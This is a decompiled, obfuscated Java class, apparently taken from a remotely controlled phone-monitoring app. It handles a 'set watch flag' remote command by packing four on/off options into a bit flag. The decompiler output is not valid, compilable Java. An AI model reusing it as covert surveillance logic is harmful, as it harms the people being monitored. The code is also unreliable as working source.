package com.vvt.remotecommand.processor.f;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import java.util.ArrayList;
import java.util.Iterator;

public class d
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public d(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    RemoteFunction localRemoteFunction = null;
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = paramRemoteCommand.getParameters();
    a(localArrayList);
    Object localObject = (String)localArrayList.get(0);
    int j = Integer.parseInt((String)localObject);
    int k;
    int m;
    label86:
    int n;
    if (j == i)
    {
      k = i;
      localObject = (String)localArrayList.get(i);
      j = Integer.parseInt((String)localObject);
      if (j != i) {
        break label345;
      }
      m = i;
      localObject = (String)localArrayList.get(2);
      j = Integer.parseInt((String)localObject);
      if (j != i) {
        break label351;
      }
      n = i;
      label115:
      localObject = (String)localArrayList.get(3);
      j = Integer.parseInt((String)localObject);
      if (j != i) {
        break label357;
      }
      j = i;
      label144:
      boolean bool4 = a;
      if (bool4) {}
      bool4 = a;
      if (bool4) {}
      bool4 = a;
      if (bool4) {}
      bool4 = a;
      if ((bool4) && (k == 0)) {
        break label373;
      }
      k = i;
    }
    for (;;)
    {
      if (m != 0) {
        k |= 0x2;
      }
      if (n != 0) {
        k |= 0x4;
      }
      if (j != 0) {}
      boolean bool2;
      for (j = k | 0x8;; bool2 = bool3)
      {
        bool3 = a;
        if (bool3) {}
        bool3 = a;
        if (bool3) {}
        locala = h();
        ControlCommand localControlCommand = new com/vvt/remotecontrol/ControlCommand;
        localRemoteFunction = RemoteFunction.SET_WATCH_FLAG;
        localObject = Integer.valueOf(j);
        localControlCommand.<init>(localRemoteFunction, localObject);
        bool2 = a;
        if (bool2) {}
        locala.execute(localControlCommand);
        if (paramc != null)
        {
          localObject = "Watch notification options are set";
          bool3 = a;
          if (bool3) {}
          paramc.b(paramRemoteCommand, this, (String)localObject);
        }
        bool2 = a;
        if (bool2) {}
        return;
        bool3 = false;
        locala = null;
        break;
        label345:
        m = 0;
        break label86;
        label351:
        n = 0;
        break label115;
        label357:
        bool2 = false;
        localObject = null;
        break label144;
      }
      label373:
      boolean bool3 = false;
      com.vvt.remotecontrol.a locala = null;
    }
  }
  
  void a(ArrayList paramArrayList)
  {
    boolean bool1 = a;
    if (bool1) {}
    int i = paramArrayList.size();
    int k = 4;
    Object localObject;
    if (i != k)
    {
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    try
    {
      Iterator localIterator = paramArrayList.iterator();
      int j;
      int m;
      do
      {
        do
        {
          boolean bool2 = localIterator.hasNext();
          if (!bool2) {
            break;
          }
          localObject = localIterator.next();
          localObject = (String)localObject;
          j = Integer.parseInt((String)localObject);
        } while (j == 0);
        m = 1;
      } while (j == m);
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    catch (NumberFormatException localNumberFormatException)
    {
      InvalidCommanFormatException localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      localInvalidCommanFormatException.<init>();
      throw localInvalidCommanFormatException;
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcSetWatchFlag";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/f/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */